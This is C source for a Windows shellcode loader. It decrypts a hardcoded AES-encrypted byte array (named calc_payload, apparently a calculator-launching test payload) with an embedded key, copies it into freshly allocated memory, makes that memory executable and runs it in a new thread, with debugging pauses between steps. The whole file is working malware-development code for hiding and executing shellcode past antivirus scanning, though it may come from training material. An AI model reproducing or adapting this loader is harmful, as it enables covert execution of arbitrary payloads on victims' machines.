#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "advapi32")

#include <psapi.h>

void DecryptAES (char * pData, size_t dataLen, char * pKey, size_t keyLen ){
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	
	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) ||
	    !CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash) ||
		!CryptHashData(hHash, (BYTE *)pKey, (DWORD)keyLen, 0) ||
		!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey) ||
		!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, pData, &dataLen)) 
		return -1;
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;	
}

int main(void) {
	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
	
	unsigned char calc_payload[] = { 0xbb, 0x47, 0x3a, 0x49, 0x10, 0x2f, 0x97, 0xe7, 0xa8, 0x21, 0xa0, 0xbb, 0xb, 0x1, 0x65, 0x32, 0xec, 0x87, 0x72, 0xc, 0x7d, 0x3c, 0x3d, 0x2a, 0xef, 0xf1, 0xc, 0x72, 0x9d, 0x85, 0x47, 0x17, 0x31, 0xd2, 0x9b, 0x30, 0xca, 0x2f, 0x8b, 0x57, 0x1a, 0xe1, 0x5c, 0x2a, 0x51, 0x2b, 0x29, 0x51, 0x1a, 0x2a, 0x3c, 0x9, 0x39, 0x80, 0xe7, 0x33, 0x15, 0x2, 0x20, 0x14, 0xa1, 0xdb, 0xf5, 0x60, 0x32, 0x1b, 0xc6, 0x41, 0x18, 0x35, 0x8, 0xc3, 0xb2, 0xbe, 0xc6, 0x45, 0x7c, 0x79, 0x6b, 0x27, 0xf6, 0x17, 0x93, 0x52, 0x38, 0x32, 0xc1, 0x4, 0x32, 0x2a, 0x23, 0xb1, 0xde, 0x80, 0x0, 0xc7, 0x3f, 0xb, 0x59, 0xc1, 0xc3, 0x6f, 0x65, 0x28, 0xe8, 0xca, 0x4e, 0x9f, 0x77, 0x58, 0x9a, 0x4a, 0x5, 0x2d, 0x5c, 0x68, 0x58, 0xff, 0x57, 0x25, 0x4c, 0xe, 0x77, 0x42, 0xa4, 0x76, 0xa9, 0x1, 0x9b, 0x20, 0x8a, 0x7d, 0xf6, 0xa, 0x2, 0xc3, 0x39, 0x5c, 0x8b, 0x73, 0x71, 0xb3, 0x52, 0x6d, 0x4b, 0xf3, 0x98, 0xf5, 0xd9, 0x8c, 0x52, 0x48, 0x8, 0xd6, 0x45, 0x5f, 0x16, 0xfb, 0x34, 0xe6, 0xf9, 0xae, 0x6e, 0x2c, 0x8b, 0x88, 0x78, 0x8a, 0x34, 0x7e, 0x80, 0x45, 0xb8, 0x25, 0x98, 0x2e, 0xd9, 0xec, 0x6f, 0xc5, 0xc7, 0x75, 0xd0, 0x9a, 0x88, 0x40, 0x3d, 0x7c, 0x25, 0x4d, 0x8a, 0x99, 0xf2, 0x2, 0x95, 0xc1, 0xaa, 0x6d, 0x60, 0x75, 0x9a, 0xc1, 0xff, 0x32, 0x14, 0x85, 0x45, 0x36, 0x17, 0x97, 0x22, 0x60, 0xcf, 0xac, 0x81, 0xb6, 0x4a, 0x1b, 0x65, 0xcb, 0x93, 0x4, 0x1a, 0x74, 0xef, 0xed, 0x3b, 0x7c, 0x6d, 0xfd, 0x48, 0x35, 0xd4, 0xfb, 0x42, 0x3a, 0x73, 0x68, 0x8d, 0x4b, 0x76, 0x7a, 0xa8, 0xb1, 0x7, 0x54, 0x78, 0x85, 0xa5, 0xb2, 0x2d, 0x6d, 0x74, 0xbc, 0xa1, 0x38, 0xe9, 0xdc, 0x5b, 0x91, 0x57, 0x47, 0xa0, 0x22, 0x3e, 0x6d, 0x31, 0x4d, 0xe3, 0x8e, 0xf9, 0x48, 0x1a, 0xe8, 0x98, 0xb6, 0xb7, 0x1c, 0x89, 0xa3, 0xbc, 0x18, 0x13, 0x30, 0x18, 0xe6, 0xdf, 0xa6 };
	unsigned int calc_len = sizeof(calc_payload);
	char key[] = { 0x84, 0x87, 0xa0, 0x51, 0xa3, 0x82, 0x14, 0xf5, 0x64, 0x4c, 0x71, 0xf7, 0xd, 0x5c, 0x6e, 0xed };
	
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	printf("%-016p \n", (void *)calc_payload);
	printf("%-016p \n", (void *)exec_mem );
	
	printf("C R Y P T ? M E");
	getchar();
	
	DecryptAES((char *) calc_payload, calc_len, key, sizeof(key));
	
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
	
	printf("W A I T F O R I T");
	getchar();
 	
	if (rv!=0){
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	
	return 0;
}
